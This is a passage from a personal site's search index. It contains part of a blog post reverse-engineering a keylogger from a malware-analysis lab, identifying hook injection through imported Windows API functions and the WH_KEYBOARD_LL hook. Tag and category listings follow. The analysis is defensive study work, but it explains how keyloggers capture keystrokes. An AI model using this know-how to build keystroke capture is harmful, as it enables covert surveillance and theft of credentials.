LOCK]\n</code></pre> <p>The following imported functions are a clear indication that the malware is performing hook injection:</p> <pre><code>SetWindowsHookExA\nCallNextHookEx\nUnhookWindowsHookEx\n</code></pre> <p>Hook injection is a technique that abuses Windows hooks to intercept messages destined for applications and is frequently used by keyloggers.</p> <p>The following imports support the keylogger hypothesis:</p> <pre><code>GetWindowTextA\nGetForegroundWindow\nWriteFile\nCreateFileA\n</code></pre> <p>Disassembling the dropped executable with IDA Pro confirms that the sample is indeed a keylogger that hooks to the <code>WH_KEYBOARD_LL</code> event (at <code>0x401058</code>).</p> <p>The <code>main</code> function is responsible for performing the hooking.</p> <p>The <code>sub_4010C7</code> routine takes care of the keylogging functionality. A quick analysis of this function reveals that the keys pressed are written to a file named <code>practicalmalwareanalysis.log</code>, along with the name of the application window they are pressed in.</p> <p>I won't go into further details here.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#lets-make-it-run","title":"Let's make it run","text":"<p>Let's fire a complete run of the malware!</p> <p>how can it be detected?</p> <p>That's all!</p>","tags":["malware"]},{"location":"categories/devops/","title":"Category: Devops","text":""},{"location":"categories/devops/#pages-in-category-devops","title":"Pages in category \"Devops\"","text":"<ul> <li>Titolo vim</li> </ul> <p>All Categories</p>"},{"location":"categories/dfir/","title":"Category: dfir","text":""},{"location":"categories/dfir/#pages-in-category-dfir","title":"Pages in category \"dfir\"","text":"<ul> <li>Welcome to Digital Forensics</li> </ul> <p>All Categories</p>"},{"location":"categories/","title":"All Categories","text":"<p>There are a total of 2 categories(s):</p> <ul> <li>Devops (1)</li> <li>dfir (1)</li> </ul>"},{"location":"tags.html","title":"Tags","text":"<p>Following is a list of relevant tags:</p>"},{"location":"tags.html#forensics","title":"forensics","text":"<ul> <li>Welcome to Digital Forensics</li> </ul>"},{"location":"tags.html#linux","title":"linux","text":"<ul> <li>How to change keyboard layout from CLI</li> <li>How to configure monitors from CLI</li> <li>How to display keyboard modifiers</li> <li>How to force the SSH client to use only provided identity</li> <li>How to manage different monitor profiles</li> </ul>"},{"location":"tags.html#malware","title":"malware","text":"<ul> <li>Process Hollowing: a reverse engineering case</li> </ul>"},{"location":"tags.html#ssh","title":"ssh","text":"<ul> <li>How to force the SSH client to use only provided identity</li> </ul>"},{"location":"tags.html#vim","title":"vim","text":"<ul> <li>Titolo vim</li> </ul>"}]}